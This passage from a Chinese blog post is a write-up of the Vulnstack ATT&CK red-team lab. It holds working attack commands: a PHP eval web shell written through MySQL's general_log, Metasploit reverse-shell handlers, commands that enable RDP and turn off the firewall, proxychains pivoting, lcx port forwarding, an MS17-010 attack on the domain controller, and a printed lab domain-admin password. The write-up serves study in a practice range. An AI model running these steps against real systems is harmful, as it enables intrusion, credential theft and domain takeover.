前面我们已经登陆到phpmyadmin，那么我们首先可以测试一下是否可以使用select into outfile直接写入</p><pre class="line-numbers language-none"><code class="language-none">Select &#39;&lt;?php eval($_POST[hack]);?&gt; &#39; into outfile &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316112634592.png"></p><p>写入失败， </p><pre class="line-numbers language-none"><code class="language-none">SHOW GLOBAL VARIABLES LIKE &#39;%secure%&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看变量secure-file-priv 值为NULL，且为只读无法修改。</p><p>尝试使用全局日志写入shell，查看全局变量general_log：</p><pre class="line-numbers language-none"><code class="language-none">SHOW GLOBAL VARIABLES LIKE &#39;%general_%&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113228177.png"></p><p>开启全局日志并修改日志保存位置为C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php</p><pre class="line-numbers language-none"><code class="language-none">set global general_log&#x3D;on;set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113435571.png"></p><p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113553829.png"></p><p>使用蚁剑连接一句话木马<code>http://192.168.1.3/hack.php</code></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113709282.png"></p><h3 id="3-3-CS上线GetShell"><a href="#3-3-CS上线GetShell" class="headerlink" title="3.3 CS上线GetShell"></a>3.3 CS上线GetShell</h3><p>CS客户端服务端都部署在192.168.1.5主机上，创建监听并生成powershell</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316115646878.png"></p><p>提权成功</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316120020075.png"></p><h3 id="3-4-系统信息收集"><a href="#3-4-系统信息收集" class="headerlink" title="3.4 系统信息收集"></a>3.4 系统信息收集</h3><p>查看网卡</p><pre class="line-numbers language-none"><code class="language-none">shell ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316125752478.png"></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316120358179.png"></p><p>发现内网ip地址192.168.52.143和域god.org，查看域信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net group /domain  <span class="token comment">#查看域内所有用户列表</span>net group “domain computers” /domain <span class="token comment">#查看域成员计算机列表</span>net group “domain admins” /domain <span class="token comment">#查看域管理员用户</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100603667-966546984.png"></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100608263-1817479356.png"></p><p>本机计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p><h3 id="3-5-主机密码收集"><a href="#3-5-主机密码收集" class="headerlink" title="3.5 主机密码收集"></a>3.5 主机密码收集</h3><p>获取系统用户名和密码</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121241458.png"></p><h3 id="3-6-远程桌面登录"><a href="#3-6-远程桌面登录" class="headerlink" title="3.6 远程桌面登录"></a>3.6 远程桌面登录</h3><p>远程开启3389端口并关闭防火墙</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">注册表开启3389端口REG ADD HKLM<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>Terminal<span class="token string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f关闭防火墙netsh firewall <span class="token builtin class-name">set</span> opmode disable   <span class="token comment">#winsows server 2003 之前</span>netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off <span class="token comment">#winsows server 2003 之后</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121449483.png"></p><p>这个时候防火墙是开启，我们需要关闭防火墙，使用域用户god\administrator&#x2F;hongrisec@2020成功登录这一台win7WEB主机</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121709477.png"></p><h2 id="0x04-攻入内网及横向移动"><a href="#0x04-攻入内网及横向移动" class="headerlink" title="0x04 攻入内网及横向移动"></a>0x04 攻入内网及横向移动</h2><p>注意：这里已经在cs端进行了提权</p><h3 id="4-1-将cs会话派生给msf"><a href="#4-1-将cs会话派生给msf" class="headerlink" title="4.1 将cs会话派生给msf"></a>4.1 将cs会话派生给msf</h3><p>打开MSF，开始监听</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_httpset lhost 192.168.1.5set lport 8888exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318163608922.png"></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318170258970.png"></p><h3 id="4-2-内网–继续信息收集"><a href="#4-2-内网–继续信息收集" class="headerlink" title="4.2 内网–继续信息收集"></a>4.2 内网–继续信息收集</h3><h4 id="4-2-1-补丁信息"><a href="#4-2-1-补丁信息" class="headerlink" title="4.2.1 补丁信息"></a>4.2.1 补丁信息</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173346684.png"></p><h4 id="4-2-2-软件安装信息"><a href="#4-2-2-软件安装信息" class="headerlink" title="4.2.2 软件安装信息"></a>4.2.2 软件安装信息</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_applications<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173500987.png"></p><h4 id="4-2-3-路由信息并添加路由"><a href="#4-2-3-路由信息并添加路由" class="headerlink" title="4.2.3 路由信息并添加路由"></a>4.2.3 路由信息并添加路由</h4><p>添加路由到目标环境网络，使得msf能够通过win7路由转发访问192.168.25.0&#x2F;24网段</p><pre class="line-numbers language-none"><code class="language-none">#查看路由信息run get_local_subnets#添加一条路由run autoroute -s 192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173738839.png"></p><p>使用msf的socks4代理模块</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318164436351.png"></p><p>文本编辑器修改<code>etc/proxychains.conf</code>，在最后一行加上socks4代理服务器</p><pre class="line-numbers language-none"><code class="language-none">[ProxyList]socks4 192.168.1.5 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后我们就可以使用proxychains代理nmap扫描主机</p><h4 id="4-2-4-arp扫描内网主机"><a href="#4-2-4-arp扫描内网主机" class="headerlink" title="4.2.4 arp扫描内网主机"></a>4.2.4 arp扫描内网主机</h4><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318174314595.png"></p><h4 id="4-2-5-内网扫描"><a href="#4-2-5-内网扫描" class="headerlink" title="4.2.5 内网扫描"></a>4.2.5 内网扫描</h4><p>扫描域控开放的端口及存在的相应漏洞</p><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -sT -sV -Pn -p22,80,443,135,445 --script&#x3D;vuln 192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318184046567.png"></p><p>挂代理访问域控的80端口</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318184117657.png"></p><p>现在我们需要认识到，直接使用proxychains使msf走代理攻击到192.168.52.138，是无法获得meterpreter会话，因此下一步使用lcx进行端口转发接收meterpreter</p><p>win7使用lcx转发</p><p>上传lcx到win7，执行命令对55555进行监听：lcx -tran 55555 192.168.1.12 12345</p><p>(命令解释：通过lcx监听本地5555端口，收到数据后转发到192.168.1.12的12345端口，因此kali需要设置监听12345来接收shell)</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220320094743824.png"></p><p>msf监听12345端口：<br>kali启动终端，输入：msfconsole启动msf</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.5set lport 12345run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220320094822558.png"></p><p>proxychains代理msf对域控（192.168.52.138）进行ms17-010攻击</p><p>kali启动终端，输入：proxychains msfconsole启动msf</p><pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;smb&#x2F;ms17_010_psexecset rhosts 192.168.52.138set lhost 192.168.52.143set lport 55555run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击完成kali成功获取到会话</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220320095044892.png"></p><p>至此成功获取到域控</p><p>对于域成员192.168.52.141 我们同样可以使用这种攻击方式，这里就不在演示</p><h2 id="0x05-说明："><a href="#0x05-说明：" class="headerlink" title="0x05 说明："></a>0x05 说明：</h2><p>经过这一次充分认识到自己的不足，还需要多加学习，有些地方自己还是没有完全弄明白，也参考了网络上的一些师傅们的教程，感谢分享。</p><p>​    需要说明的是，获取域控的方式有很多，这里我们是直接利用了主机本身存在的安全漏洞。对于攻击成功以后的痕迹清理等等，都没有涉及到，不足的地方再查漏补缺，后续的系列文章中，我们再不断的学习不同的利用方式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ATT-amp-CK红队评估实战靶场（一）&quot;&gt;&lt;a href=&quot;#ATT-amp-CK红队评估实战靶场（一）&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK红队评估实战靶场（一）&quot;&gt;&lt;/a&gt;ATT&amp;amp;CK红队评估实战靶场（一）&lt;/</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://hdys0vn.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
